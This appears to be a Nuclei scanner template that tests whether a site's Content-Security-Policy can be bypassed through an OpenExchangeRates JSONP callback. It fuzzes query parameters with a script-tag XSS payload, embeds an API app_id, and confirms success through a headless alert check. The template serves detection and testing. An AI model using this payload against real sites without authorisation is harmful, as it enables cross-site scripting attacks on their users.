id: openexchangerates-csp-xss

info:
  name: Content-Security-Policy Bypass via OpenExchangeRates
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,openexchangerates

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{RootURL}}{{trim_prefix(http_matched, RootURL)}}"

      - action: waitload

      - action: waitdialog
        name: openexchangerates_csp_xss
        args:
          type: alert
          timeout: 5000

    matchers:
      - type: dsl
        dsl:
          - "openexchangerates_csp_xss == true" 